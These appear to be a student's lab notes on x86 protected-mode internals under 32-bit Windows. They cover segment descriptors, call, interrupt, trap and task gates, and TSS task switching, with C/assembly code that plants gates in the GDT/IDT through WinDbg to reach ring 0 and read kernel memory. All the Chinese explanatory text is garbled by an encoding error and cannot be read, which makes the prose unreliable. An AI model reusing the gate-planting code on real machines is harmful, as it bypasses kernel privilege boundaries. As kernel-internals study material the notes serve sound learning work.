Limit=f ffff 16~12 [f]=1111 p=1 DPL=11(3) s=1 Type=0011 Address=0000 æ®µæè¿°ç¬¦å±æ€§Sä½_TYPEåŸŸ åˆ¤æ–­å“ªäº›æ˜¯ç³»ç»Ÿæ®µæè¿°ç¬¦?å“ªäº›æ˜¯ä»£ç æˆ–è€…æ•°æ®æ®µæè¿°ç¬¦?\nå› ä¸ºDPLçš„å€¼åªå¯èƒ½æ˜¯å…¨1æˆ–å…¨0ï¼Œæ‰€ä»¥16~12ä½å¦‚æœæ˜¯æ•°æ®æ®µæˆ–ä»£ç æ®µçš„è¯åªèƒ½ä¸ºf(1111)æˆ–9(1001)ã€‚é‚£ä¹ˆåœ¨æ®µæè¿°ç¬¦ä¸­æ‰¾ç¬¬äº”ä½ï¼Œå¦‚æœæ˜¯fæˆ–9å°±æ˜¯æ•°æ®æ®µæˆ–ä»£ç æ®µã€‚\nåˆ¤æ–­å“ªäº›æ˜¯ä»£ç æ®µæè¿°ç¬¦ï¼Ÿå“ªäº›æ˜¯æ•°æ®æ®µæè¿°ç¬¦ï¼Ÿ\nå› ä¸ºTYPEåŸŸçš„ç¬¬11ä½åªå¯èƒ½æ˜¯1æˆ–0ï¼Œè€Œä¸”å…¨ä¸º1æ˜¯ä»£ç æ®µï¼›å…¨ä¸º0æ˜¯æ•°æ®æ®µã€‚é‚£ä¹ˆåœ¨æ®µæè¿°ç¬¦ä¸­ç¬¬å…­ä½å¤§äº8å°±æ˜¯ä»£ç æ®µï¼Œå°äº8å°±æ˜¯æ•°æ®æ®µã€‚\næŸ¥åˆ†å‡ ä¸ªæ•°æ®æ®µ: E W A\n00009302`2f40ffff Base=00 02 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 ffff 16~12 [9]=1001 p=1 DPL=00(0) s=1 Type=0011 --\u003eå¯è¯»å†™ï¼Œè®¿é—®è¿‡ Address=2f40 0000920b`80003fff Base=00 0b 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 3fff 16~12 [9]=1001 p=1 DPL=00(0) s=1 Type=0010 --\u003eå¯è¯»å†™ Address=8000 æŸ¥åˆ†å‡ ä¸ªä»£ç æ®µ:C R A\n80009a80`0000ffff Base=80 80 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 ffff 16~12 [9]=1001 p=1 DPL=00(0) s=1 Type=1010 --\u003eå¯è¯»æ‰§è¡Œ Address=0000 00cffb00`0000ffff Base=00 00 23~20 [c]= 1100 G=1 D/B=1 AVL=0 Limit=f ffff 16~12 [f]=1111 p=1 DPL=11(3) s=1 Type=1011 --\u003eå¯è¯»æ‰§è¡Œï¼Œè®¿é—®è¿‡ Address=0000 æŸ¥åˆ†å‡ ä¸ªç³»ç»Ÿæ®µæè¿°ç¬¦\n80008955`27000068 Base=80 55 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 0068 16~12 [8]=1000 p=1 DPL=00(0) s=0 Type=1001 --\u003e386ä»¥ä¸ŠCPUçš„TSSï¼Œtypeç¬¬3ä½ä¸º1 Address=2700 80008955`27680068 Base=80 55 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 0068 16~12 [8]=1000 p=1 DPL=00(0) s=0 Type=1001 --\u003e386ä»¥ä¸ŠCPUçš„TSSï¼Œtypeç¬¬3ä½ä¸º1 Address=2768 æ®µæƒé™æ£€æŸ¥ åœ¨3ç¯èƒ½åŠ è½½çš„æ•°æ®æ®µæœ‰å“ªäº›ï¼Ÿ\nCPL=3æ˜¯æœ€ä½æƒé™ï¼Œé‚£ä¹ˆåªèƒ½åŠ è½½æ›´ä½æƒé™æˆ–ç›¸åŒæƒé™çš„æ•°æ®æ®µï¼Œæ‰€ä»¥å¯ä»¥åŠ è½½DPL=3çš„æ•°æ®æ®µ\nåœ¨0ç¯èƒ½åŠ è½½çš„æ•°æ®æ®µæœ‰å“ªäº›?\nCPL=0ï¼Œå’Œç¬¬ä¸€é¢˜ä¸€æ ·ï¼Œæ‰€ä»¥å¯ä»¥åŠ è½½DPL=0 / 1 / 2 / 3çš„æ•°æ®æ®µ\nè¯¦ç»†æè¿°è¿™ä¸‹é¢ä»£ç çš„æ‰§è¡Œè¿‡ç¨‹:\nmov ax,0x23 #0x23=0010 0011é‚£ä¹ˆrplä¸º11(3)ï¼Œindex=00100(4)ï¼Œåœ¨GDTè¡¨ä¸­æ‰¾ç´¢å¼•ä¸º4ï¼Œæ¥ç€å»æ£€æŸ¥è¯¥æ®µæè¿°ç¬¦æ˜¯å¦ä¸ºæœ‰æ•ˆï¼Œç„¶åçœ‹Sä½æ˜¯å¦æ˜¯æ•°æ®/ä»£ç æ®µè¿˜æ˜¯ç³»ç»Ÿæ®µï¼Œç„¶åå†çœ‹TYPEåŸŸï¼Œæ¯”å¦‚æˆ‘æ‰¾çš„ä¸º00cff300`0000ffffï¼Œdplå°±ä¸º3 mov ds,ax ä»£ç é—´çš„è·³è½¬ åé¢çš„å®éªŒè™šæ‹Ÿæœºä¸€å®šè¦ä½¿ç”¨å•æ ¸å•å¤„ç†å™¨ï¼Œä¸ç„¶å®éªŒä¼šå¤±è´¥çš„ï¼ï¼ï¼\nè®°ä½ä»£ç æ®µé—´è·³è½¬çš„æ‰§è¡Œæµç¨‹\n1ã€æ®µé€‰æ‹©å­æ‹†åˆ† 2ã€æŸ¥è¡¨å¾—åˆ°æ®µæè¿°ç¬¦ 3ã€æƒé™æ£€æŸ¥ 4ã€åŠ è½½æ®µæè¿°ç¬¦ 5ã€ä»£ç æ‰§è¡Œ è‡ªå·±å®ç°ä¸€è‡´ä»£ç æ®µçš„æ®µé—´è·³è½¬ã€‚\nè¦æ±‚ï¼šCPL \u003e= DPL\né€šè¿‡windbgçš„æŒ‡ä»¤eq åœ°å€ å†…å®¹(eq 8003f048 00c9fc00 0000ffff)ï¼Œæ„å»ºæ®µæè¿°ç¬¦00C9FC00Â·0000FFFFï¼Œå¹¶ä¸”è®°å¥½ç´¢å¼•ä½ç½® æ‰§è¡ŒæŒ‡ä»¤jmp far xx:xxxxxxxx å¦‚æœæˆåŠŸå°±ä¼šä¿®æ”¹cså’Œeip è‡ªå·±å®ç°éä¸€è‡´ä»£ç æ®µçš„æ®µé—´è·³è½¬ã€‚\nè¦æ±‚ï¼š CPL == DPL å¹¶ä¸” RPL \u003c= DPL\nè°ƒç”¨é—¨ è‡ªå·±å®ç°è°ƒç”¨é—¨ï¼ˆææƒã€æ— å‚æ•°ã€EAXã€ECXã€‚å­˜ä¸å­˜ï¼Ÿï¼‰\nè°ƒç”¨é—¨æè¿°ç¬¦ä¸ºï¼š0000EC00Â·00080000\nä»£ç å¦‚ä¸‹ï¼š\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e void __declspec(naked) GetRegister() { _asm { int 3 retf } } void main() { char buff[6]; *(DWORD*)\u0026buff[0] = 0x12345678; // EIP, åºŸå¼ƒ *(WORD*)\u0026buff[4] = 0x48; // æ®µé€‰æ‹©å­ _asm { call far fword ptr[buff] } getchar(); } åœ¨windbgä¸­å¯ä»¥æ–­ä¸‹\nå‘ç°SSã€ESPã€CSå¯„å­˜å™¨éƒ½å‘ç”Ÿäº†å˜åŒ–\nè‡ªå·±å®ç°è°ƒç”¨é—¨ï¼ˆææƒã€æœ‰å‚æ•°ï¼‰\néœ€è¦çœ‹ä¸€ä¸‹è°ƒç”¨é—¨ï¼š\nè°ƒç”¨é—¨æè¿°ç¬¦ä¸ºï¼š0000EC03Â·00080000\nä»£ç å¦‚ä¸‹ï¼š\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e DWORD x; DWORD y; DWORD z; void __declspec(naked) GetRegister() { _asm { pushad pushfd mov eax,[esp+0x24+0x8+0x8] mov dword ptr ds:[x],eax mov eax,[esp+0x24+8+4] mov dword ptr ds:[y],eax mov eax,[esp+0x24+8+0] mov dword ptr ds:[z],eax popfd popad retf 0xC } } void Printfall() { printf(\"%x %x %x\\n\",x,y,z); } void main() { char buff[6]; *(DWORD*)\u0026buff[0] = 0x12345678; // EIP, åºŸå¼ƒ *(WORD*)\u0026buff[4] = 0x48; // æ®µé€‰æ‹©å­ _asm { push 1 push 2 push 3 call far fword ptr[buff] } Printfall(); getchar(); } å¦‚ä½•é€šè¿‡å®éªŒè®ºè¯0ç¯å †æ ˆå­˜å‚¨å“ªäº›æ•°æ®ï¼Œé¡ºåºæ˜¯ä»€ä¹ˆï¼Ÿ\nè¿™å‡ è¡Œä»£ç æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Ÿæ˜¯å¿…é¡»çš„å—ï¼Ÿ\npushad pushfd â€¦â€¦ popfd popad ç”¨äºä¿å­˜å’Œæ¢å¤å¯„å­˜å™¨çš„çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯ä¿æŠ¤ç°åœºï¼Œé˜²æ­¢å…¶ä»–å¯„å­˜å™¨è¢«ä¿®æ”¹ã€‚\nè¿™å‡ è¡Œä»£ç åœ¨åšä»€ä¹ˆï¼Ÿ\nmov eax,[esp+0x24+0x8+0x8] mov eax,[esp+0x24+0x8+0x8] mov eax,[esp+0x24+8+0] è®¿é—®æˆ‘åœ¨æ ˆä¸­å­˜çš„å‚æ•°ï¼ŒæŸ¥çœ‹æ ˆçš„å†…å®¹å¦‚ä¸‹ï¼š\nkd\u003e dd b1ba6da0 ReadVirtual: b1ba6da0 not properly sign extended b1ba6da0 00000212 0012ff80 00000000 0012ff80 b1ba6db0 b1ba6dc4 7ffde000 00380df8 00000000 b1ba6dc0 cccccccc 004010ee 0000001b 00000003 b1ba6dd0 00000002 00000001 0012ff1c 00000023 b1ba6de0 805470de b12221f0 8a31b970 00000000 b1ba6df0 0000027f 00000000 00000000 00000000 b1ba6e00 00000000 ffff0000 00001f80 00000000 b1ba6e10 00000000 00000000 00000000 00000000 é‚£ä¹ˆï¼Œesp+0x24+8å°±æ˜¯b1ba6dccçš„ä½ç½®ï¼Œå°±æ˜¯è®¿é—®å‚æ•°3ï¼Œ2ï¼Œ1ã€‚\næ›´ç›´è§‚ä¸€ç‚¹ï¼Œä¸åŠ pushadï¼Œpushfdï¼Œå¦‚ä¸‹ï¼š\nkd\u003e dd bad7fdc4 ReadVirtual: bad7fdc4 not properly sign extended bad7fdc4 004010ee 0000001b 00000003 00000002 #004010eeæ˜¯è¿”å›åœ°å€ï¼Œ0000001bæ˜¯æ—§csï¼Œ0012ff1cæ˜¯æ—§espï¼Œ23æ˜¯æ—§ss bad7fdd4 00000001 0012ff1c 00000023 805470de bad7fde4 ba60eb85 8a25cd00 00000000 0000027f bad7fdf4 00000000 00000000 00000000 00000000 bad7fe04 ffff0000 00001f80 00000000 00000000 bad7fe14 00000000 00000000 00000000 00000000 bad7fe24 00000000 00000000 00000000 00000000 bad7fe34 00000000 00000000 00000000 00000000 æµ‹è¯• è¦æ±‚ï¼šä»£ç æ­£å¸¸æ‰§è¡Œä¸è“å±\næ„é€ ä¸€ä¸ªè°ƒç”¨é—¨ï¼Œå®ç°3ç¯è¯»å–é«˜2Gå†…å­˜ã€‚\nè°ƒç”¨é—¨æè¿°ç¬¦ä¸ºï¼š0000EC00Â·00080000\nä»£ç å¦‚ä¸‹ï¼š\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e DWORD x; DWORD y; DWORD z; void __declspec(naked) GetRegister() { _asm { pushad pushfd mov eax,0x8003f008 mov ebx,[eax] mov x,ebx mov ecx,4 add eax,ecx mov ebx,[eax] mov y,ebx add eax,ecx mov ebx,[eax] mov z,ebx popfd popad retf } } void Printfall() { printf(\"%x %x %x\\n\",x,y,z); } void main() { char buff[6]; *(DWORD*)\u0026buff[0] = 0x12345678; // EIP, åºŸå¼ƒ *(WORD*)\u0026buff[4] = 0x48; // æ®µé€‰æ‹©å­ _asm { call far fword ptr[buff] } Printfall(); getchar(); } è¾“å‡ºç»“æœï¼šffff cf9b00 ffff åœ¨ç¬¬ä¸€é¢˜çš„åŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹ï¼Œå®ç°é€šè¿‡ç¿»å¢™çš„æ–¹å¼è¿”å›åˆ°å…¶ä»–åœ°å€ã€‚\nè°ƒç”¨é—¨æè¿°ç¬¦ä¸ºï¼š0000EC00Â·00080000\nä»£ç å¦‚ä¸‹ï¼š\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e void __declspec(naked) GetRegister() { _asm { pop eax mov eax,0x401070 //å‡½æ•°Printfall()çš„åœ°å€ push eax retf } } void Printfall() { printf(\"okokokokokokok\"); } void main() { char buff[6]; *(DWORD*)\u0026buff[0] = 0x12345678; // EIP, åºŸå¼ƒ *(WORD*)\u0026buff[4] = 0x48; // æ®µé€‰æ‹©å­ _asm { call far fword ptr[buff] } getchar(); } è¾“å‡ºç»“æœï¼šokokokokokokok åœ¨ç¬¬ä¸€é¢˜çš„åŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹ï¼Œåœ¨é—¨ä¸­å†å»ºä¸€ä¸ªé—¨è·³è½¬åˆ°å…¶ä»–åœ°å€ã€‚\nè°ƒç”¨é—¨æè¿°ç¬¦ä¸ºï¼š0000EC00Â·00080000\nä»£ç å¦‚ä¸‹ï¼š\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e int x=0; int y=0; char buff[6] = {0,0,0,0,0x48,0}; char buff1[6] = {0,0,0,0,0x90,0}; void __declspec(naked) GetRegister() { _asm { mov x,1 mov eax,0x00081070 mov ebx,0x8003f090 mov [ebx],eax mov eax,0x0040ec00 mov ebx,0x8003f094 mov [ebx],eax call far fword ptr[buff1] retf } } void __declspec(naked) two() { _asm { mov y,1 retf } } void main() { _asm { call far fword ptr[buff] } printf(\"%x %x\",x,y); getchar(); } è¾“å‡ºç»“æœï¼š1 1 ä¸­æ–­é—¨ è‡ªå·±å®ç°ä¸­æ–­é—¨\nä¸­æ–­é—¨æè¿°ç¬¦ä¸ºï¼š0000EE00Â·00080000\nä»£ç å¦‚ä¸‹ï¼š\n#include\u003cstdio.h\u003e #include\u003cwindows.h\u003e DWORD H void __declspec(naked) test(){ __asm{ pushad pushfd mov eax,0x8003f008 mov ebx,[eax] mov H,ebx popfd popad iretd } } int main(){\t__asm{ int 0x20; } printf(\"%X\", H); return 0; } è¾“å‡ºç»“æœï¼šFFFF åœ¨è°ƒç”¨é—¨ä¸­å®ç°ä½¿ç”¨IRETDè¿”å›\nè°ƒç”¨é—¨æè¿°ç¬¦ä¸ºï¼š0000EC00Â·00080000\nä»£ç å¦‚ä¸‹ï¼š\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e char buff[6] = {0,0,0,0,0x48,0}; void __declspec(naked) GetRegister() { _asm { pop eax pop ebx mov ecx,0x11111111 push ecx push ebx push eax iretd } } void main() { _asm { call far fword ptr[buff] } printf(\"okokokokokokok\"); getchar(); } è¾“å‡ºç»“æœï¼šokokokokokokok åœ¨ä¸­æ–­é—¨ä¸­å®ç°ç”¨RETFè¿”å›\nä¸­æ–­é—¨æè¿°ç¬¦ä¸ºï¼š0000EE00Â·00080000\nä»£ç å¦‚ä¸‹ï¼š\n#include\u003cstdio.h\u003e #include\u003cwindows.h\u003e void __declspec(naked) test(){ __asm{ pop eax pop ebx popfd push ebx push eax retf } } int main(){\t__asm{ int 0x20; } printf(\"okokokokokokok\"); getchar(); return 0; } é™·é˜±é—¨ æ„é€ é™·é˜±é—¨ é™·é˜±é—¨æè¿°ç¬¦ä¸ºï¼š0000EF00Â·001b0000\nä»£ç å¦‚ä¸‹ï¼š\n#include\u003cstdio.h\u003e #include\u003cwindows.h\u003e void __declspec(naked) test(){ __asm{ pop eax pop ebx popfd push ebx push eax retf } } int main(){\t__asm{ int 0x20; } printf(\"okokokokokokok\"); getchar(); return 0; } è¾“å‡ºç»“æœï¼šokokokokokokok ä»»åŠ¡æ®µ æ‰¾å‡ºGDTè¡¨ä¸­æ‰€æœ‰çš„TSSæ®µæè¿°ç¬¦\n8003f000 00000000`00000000 00cf9b00`0000ffff 8003f010 00cf9300`0000ffff 00cffb00`0000ffff 8003f020 00cff300`0000ffff 80008b04`200020ab 8003f030 ffc093df`f0000001 0040f300`00000fff 8003f040 0000f200`0400ffff 00000000`00000000 8003f050 80008955`27000068 80008955`27680068 8003f060 00009302`2f40ffff 0000920b`80003fff 8003f070 ff0092ff`700003ff 80009a40`0000ffff 8003f080 80009240`0000ffff 00009200`00000000 ç»“å°¾ä¸º68ï¼Œ8003f050ä¸8003f058\nå®ç°ä»»åŠ¡åˆ‡æ¢\næ³¨ï¼šä½¿ç”¨æŒ‡ä»¤!process 0 0è·å–Cr3çš„å€¼ï¼ˆå¯¹åº”è°ƒè¯•ç¨‹åºçš„Cr3ï¼Œæ¯”å¦‚DirBase: 0aac0380ï¼‰\né—¨æè¿°ç¬¦ä¸ºï¼š0000e900Â·00000068\nä»£ç å¦‚ä¸‹ï¼š\n#include \u003cWindows.h\u003e #include \u003cstdlib.h\u003e DWORD dwOK; DWORD dwESP; DWORD dwCS; void __declspec(naked) test() { dwOK=1; __asm { mov eax,esp; mov dwESP,eax; mov word ptr [dwCS],ax; iretd; } } int main(int argc,char * argv[]) { char stack[100]={0}; //è‡ªå·±æ„é€ ä¸€ä¸ªå †æ ˆä½¿ç”¨ DWORD cr3=0; DWORD addr=0; char buffer[6]={0}; //æ„é€ ä»»åŠ¡æ®µ DWORD tss[0x68]={ 0x0, //link 0x0, //esp0 0x0, //ss0 0x0, //esp1 0x0, //ss1 0x0, //esp2 0x0, //ss2 0, //cr3 * (DWORD)addr, //eip * 0, //eflags 0, //eax 0, //ecx 0, //edx 0, //ebx ((DWORD)stack) + 100, //esp * 0, //ebp 0, //esi 0, //edi 0x23, //es * 0x08, //cs * 0x10, //ss * 0x23, //ds * 0x30, //fs * 0, //gs 0, //idt 0x20ac0000 //IOæƒé™ä½å›¾ï¼ŒVISTAä¹‹åä¸å†ç”¨äº†ï¼Œä»å…¶ä»–ç»“æ„ä½“æ‹·è´å‡ºæ¥ã€‚ }; printf(\"Target:\\n\"); scanf(\"%x\",\u0026addr); tss[8]=addr; printf(\"tssï¼š%x\\n\",tss); printf(\"CR3:\\n\"); scanf(\"%x\",\u0026cr3); //çœ‹å‡†äº†DirBase: tss[7]=cr3; *(WORD*)(\u0026buffer[4])=0x93; __asm { call fword ptr [buffer]; } printf(\"dwESP=%x\\tdwCS=%x\\n\",dwESP,dwCS); system(\"pause\"); return 0; } è¾“å‡ºç»“æœï¼šdwESP=12ff80 dwCS=ff80 ä»»åŠ¡é—¨ è‡ªå·±å®ç°ä¸€ä¸ªä»»åŠ¡é—¨ã€‚\né—¨æè¿°ç¬¦ä¸ºï¼š0000e900Â·00000068\nä»£ç å¦‚ä¸‹ï¼š\n#include \u003cWindows.h\u003e #include \u003cstdlib.h\u003e void __declspec(naked) test() { __asm { iretd; } } int main(int argc,char * argv[]) { char stack[100]={0}; //è‡ªå·±æ„é€ ä¸€ä¸ªå †æ ˆä½¿ç”¨ DWORD cr3=0; DWORD addr=0; DWORD tss[0x68]={ 0x0, //link 0x0, //esp0 0x0, //ss0 0x0, //esp1 0x0, //ss1 0x0, //esp2 0x0, //ss2 0, //cr3 * (DWORD)addr, //eip * 0, //eflags 0, //eax 0, //ecx 0, //edx 0, //ebx ((DWORD)stack) + 100, //esp * 0, //ebp 0, //esi 0, //edi 0x23, //es * 0x08, //cs * 0x10, //ss * 0x23, //ds * 0x30, //fs * 0, //gs 0, //idt 0x20ac0000 //IOæƒé™ä½å›¾ï¼ŒVISTAä¹‹åä¸å†ç”¨äº†ï¼Œä»å…¶ä»–ç»“æ„ä½“æ‹·è´å‡ºæ¥ã€‚ }; printf(\"Target:\\n\"); scanf(\"%x\",\u0026addr); tss[8]=addr; printf(\"tssï¼š%x\\n\",tss); printf(\"CR3:\\n\"); scanf(\"%x\",\u0026cr3); //çœ‹å‡†äº†DirBase: tss[7]=cr3; __asm { int 20; } //kd \u003e eq 8003f048 0000e912Â·ff140068 å†™å…¥TSSæ®µæè¿°ç¬¦åˆ°GDT //kd \u003e eq 8003f500 0000e500Â·004b0000 å†™å…¥ä»»åŠ¡é—¨åˆ° IDT system(\"pause\"); return 0; } æˆåŠŸæ‰§è¡ŒğŸ¥² åœ¨ä¿æŠ¤æ¨¡å¼ä¸­ï¼Œå½“CPUæ£€æµ‹åˆ°å¼‚å¸¸çš„æ—¶å€™ï¼Œä¼šæ ¹æ®å¼‚å¸¸çš„ç±»å‹æ¥æŸ¥æ‰¾å¯¹åº”çš„å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œæ¯”å¦‚ï¼šå½“æŒ‡ä»¤æ£€æµ‹åˆ°é™¤é›¶å¼‚å¸¸æ—¶ï¼Œå°†é»˜è®¤æ‰§è¡Œ0å·ä¸­æ–­ï¼Œè¯·åˆ—å‡ºå¤„ç†é™¤é›¶å¼‚å¸¸å‡½æ•°çš„åœ°å€ã€‚\n80548e00`000831a0 address:0x805431a0 ffffffff`805431a0 6a00 push 0 ffffffff`805431a2 66c74424020000 mov word ptr [esp+2], 0 ffffffff`805431a9 55 push ebp ffffffff`805431aa 53 push ebx ffffffff`805431ab 56 push esi ffffffff`805431ac 57 push edi ffffffff`805431ad 0fa0 push fs ffffffff`805431af bb30000000 mov ebx, 30h ffffffff`805431b4 668ee3 mov fs, bx ffffffff`805431b7 648b1d00000000 mov ebx, dword ptr fs:[0] ffffffff`805431be 53 push ebx ffffffff`805431bf 83ec04 sub esp, 4 ffffffff`805431c2 50 push eax ffffffff`805431c3 51 push ecx ffffffff`805431c4 52 push edx ffffffff`805431c5 1e push ds ffffffff`805431c6 06 push es ffffffff`805431c7 0fa8 push gs ffffffff`805431c9 66b82300 mov ax, 23h ffffffff`805431cd 83ec30 sub esp, 30h ffffffff`805431d0 668ed8 mov ds, ax ffffffff`805431d3 668ec0 mov es, ax ffffffff`805431d6 8bec mov ebp, esp ffffffff`805431d8 f744247000000200 test dword ptr [esp+70h], 20000h ffffffff`805431e0 7596 jne ntkrpamp!V86_kit0_a (80543178) ffffffff`805431e2 fc cld ffffffff`805431e3 8b5d60 mov ebx, dword ptr [ebp+60h] ffffffff`805431e6 8b7d68 mov edi, dword ptr [ebp+68h] ffffffff`805431e9 89550c mov dword ptr [ebp+0Ch], edx ffffffff`805431ec c74508000ddbba mov dword ptr [ebp+8], 0BADB0D00h ffffffff`805431f3 895d00 mov dword ptr [ebp], ebx ffffffff`805431f6 897d04 mov dword ptr [ebp+4], edi ffffffff`805431f9 64f60550000000ff test byte ptr fs:[50h], 0FFh ffffffff`80543201 0f85edfeffff jne ntkrpamp!Dr_kit0_a (805430f4) ffffffff`80543207 f7457000000200 test dword ptr [ebp+70h], 20000h ffffffff`8054320e 753d jne ntkrpamp!_KiTrap00+0xad (8054324d) ffffffff`80543210 f6456c01 test byte ptr [ebp+6Ch], 1 ffffffff`80543214 7407 je ntkrpamp!_KiTrap00+0x7d (8054321d) ffffffff`80543216 66837d6c1b cmp word ptr [ebp+6Ch], 1Bh ffffffff`8054321b 751d jne ntkrpamp!_KiTrap00+0x9a (8054323a) ffffffff`8054321d fb sti ffffffff`8054321e 55 push ebp ffffffff`8054321f e87c040600 call ntkrpamp!_Ki386CheckDivideByZeroTrap@4 (805a36a0) ffffffff`80543224 8b5d68 mov ebx, dword ptr [ebp+68h] ffffffff`80543227 e9ebfdffff jmp ntkrpamp!Kei386EoiHelper@0+0x16b (80543017) ffffffff`8054322c fb sti ffffffff`8054322d 8b5d68 mov ebx, dword ptr [ebp+68h] ffffffff`80543230 b8940000c0 mov eax, 0C0000094h ffffffff`80543235 e9ddfdffff jmp ntkrpamp!Kei386EoiHelper@0+0x16b (80543017) ffffffff`8054323a 648b1d24010000 mov ebx, dword ptr fs:[124h] ffffffff`80543241 8b5b44 mov ebx, dword ptr [ebx+44h] ffffffff`80543244 83bb5801000000 cmp dword ptr [ebx+158h], 0 ffffffff`8054324b 74df je ntkrpamp!_KiTrap00+0x8c (8054322c) ffffffff`8054324d 6a00 push 0 ffffffff`8054324f e8a42c0000 call ntkrpamp!_Ki386VdmReflectException_A@4 (80545ef8) ffffffff`80543254 0ac0 or al, al ffffffff`80543256 74d4 je ntkrpamp!_KiTrap00+0x8c (8054322c) ffffffff`80543258 e94ffcffff jmp ntkrpamp!Kei386EoiHelper@0 (80542eac) ffffffff`8054325d 8d4900 lea ecx, [ecx] ffffffff`80543260 c74568c8245480 mov dword ptr [ebp+68h], 805424C8h ffffffff`80543267 806571fe and byte ptr [ebp+71h], 0FEh ffffffff`8054326b e93cfcffff jmp ntkrpamp!Kei386EoiHelper@0 (80542eac) åœ¨ä¿æŠ¤æ¨¡å¼ä¸­ï¼Œå½“CPUæ£€æµ‹åˆ°å¼‚å¸¸çš„æ—¶å€™ï¼Œä¼šæ ¹æ®å¼‚å¸¸çš„ç±»å‹æ¥æŸ¥æ‰¾å¯¹åº”çš„å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œæ¯”å¦‚:å½“æŒ‡ä»¤æ£€æµ‹åˆ°é™¤é›¶å¼‚å¸¸æ—¶ï¼Œå°†é»˜è®¤æ‰§è¡Œ0å·ä¸­æ–­æ‰€æŒ‡å®šçš„å¼‚å¸¸å¤„ç†ç¨‹åº,ä½†æ˜¯,å¼‚å¸¸å¤„ç†ç¨‹åºæœ¬èº«ä»»ç„¶å¯èƒ½å‡ºç°å¼‚å¸¸,å¦‚æœå¼‚å¸¸å¤„ç†ç¨‹åºå‡ºç°å¼‚å¸¸æ—¶å€™ï¼ˆåŒé‡é”™è¯¯ï¼‰ ,CPUä¼šé»˜è®¤æ‰§è¡Œ8å·ä¸­æ–­ï¼Œè¯·åˆ†æ8å·ä¸­æ–­æ˜¯ä»€ä¹ˆï¼Ÿåšäº†ä»€ä¹ˆäº‹æƒ…ï¼Ÿæ›¿æ¢äº†å“ªäº›å¯„å­˜å™¨ï¼Ÿæ›¿æ¢åçš„å€¼æ˜¯å¤šå°‘ï¼Ÿä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡ï¼Ÿ\n00008500`00501198 50 = 0101 0 000 index = 10 é—¨å¦‚ä¸‹ï¼š 80008955`87000068 address=80558700 kd\u003e dd 80558700 ReadVirtual: 80558700 not properly sign extended 80558700 00000000 80555700 00000010 00000000 80558710 00000000 00000000 00000000 00039000 80558720 804e0891 00000000 00000000 00000000 80558730 00000000 00000000 80555700 00000000 80558740 00000000 00000000 00000023 00000008 80558750 00000010 00000023 00000030 00000000 80558760 00000000 20ac0000 00000028 80555700 80558770 00000010 00000000 00000000 00000000 å¯ä»¥çœ‹åˆ°ï¼Œæ”¹äº†ESP0 = 80555700ï¼ŒSS0 = 10ï¼ŒEIP = 804e0891ï¼ŒESP = 80555700ï¼ŒES = 23ï¼ŒCS = 8ï¼ŒSS = 10ï¼ŒDS = 23ï¼ŒFS = 30 å°†eipæ”¾åˆ°åæ±‡ç¼–çª—å£å¯ä»¥çœ‹åˆ°å¦‚ä¸‹: nt!KiTrap08: ffffffff`804e0891 fa cli ffffffff`804e0892 648b0d3c000000 mov ecx, dword ptr fs:[3Ch] â€¦â€¦ è¿™å°±æ˜¯8å·ä¸­æ–­çš„æ‰§è¡Œçš„ä½ç½® è€ƒè¯• å°†æŸä¸€ä»£ç ç‰‡è¿è¡Œåˆ°1ç¯\né—¨æè¿°ç¬¦ä¸ºï¼š0000e900Â·00000068\nä»£ç å¦‚ä¸‹ï¼š\n//eq 8003f0d8 0040E912`FD6C0068 ;TSSæè¿°ç¬¦ D9ï¼Œæ³¨æ„æ­£ç¡® //eq 8003f0b0 00CFBB00`0000FFFF ;cs:B1 //eq 8003f0b8 00CFB300`0000FFFF ;ss:B9 //eq 8003f0c0 FFC0B3DF`F0000001 ;fs:C1ï¼Œè¿™ä¸ªä¸œè¥¿æ˜¯å…³é”®ï¼Œè¿æ°”ä¸å¥½å®¹æ˜“å› çº¿ç¨‹åˆ‡æ¢è“å± #include \u003cWindows.h\u003e #include \u003cstdlib.h\u003e DWORD dwOK; DWORD dwESP; DWORD dwCS; void __declspec(naked) test() { __asm { mov eax,esp; mov dwESP,eax; mov word ptr [dwCS],cs; iretd; } } int main(int argc,char * argv[]) { char stack[100]={0}; //è‡ªå·±æ„é€ ä¸€ä¸ªå †æ ˆä½¿ç”¨ DWORD cr3=0; DWORD addr=0; char buffer[6]={0}; //æ„é€ ä»»åŠ¡æ®µ DWORD tss[0x68]={ 0x0, //link 0x0, //esp0 0x0, //ss0 0x0, //esp1 0x0, //ss1 0x0, //esp2 0x0, //ss2 0, //cr3 * (DWORD)addr, //eip * 0, //eflags 0, //eax 0, //ecx 0, //edx 0, //ebx ((DWORD)stack) + 100, //esp * 0, //ebp 0, //esi 0, //edi 0x23, //es * 0xB1, //cs * 0xB9, //ss * 0x23, //ds * 0xC1, //fs * 0, //gs 0, //idt 0x20ac0000 //IOæƒé™ä½å›¾ï¼ŒVISTAä¹‹åä¸å†ç”¨äº†ï¼Œä»å…¶ä»–ç»“æ„ä½“æ‹·è´å‡ºæ¥ã€‚ }; printf(\"Target:\\n\"); scanf(\"%x\",\u0026addr); tss[8]=addr; printf(\"tssï¼š%x\\n\",tss); printf(\"CR3:\\n\"); scanf(\"%x\",\u0026cr3); //çœ‹å‡†äº†DirBase: tss[7]=cr3; *(WORD*)(\u0026buffer[4])=0xDB; __asm { call fword ptr [buffer]; } printf(\"dwESP=%x\\tdwCS=%x\\n\",dwESP,dwCS); system(\"pause\"); return 0; } 10-10-12åˆ†é¡µ 